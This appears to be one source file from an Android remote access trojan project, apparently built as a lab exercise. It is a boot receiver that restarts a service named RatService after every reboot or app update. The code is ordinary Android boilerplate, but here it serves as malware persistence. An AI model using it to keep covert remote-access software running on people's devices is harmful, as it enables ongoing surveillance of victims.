package com.lab.rat.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.lab.rat.RatService

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_MY_PACKAGE_REPLACED -> {
                val i = Intent(ctx, RatService::class.java)
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i)
                else ctx.startService(i)
            }
        }
    }
}
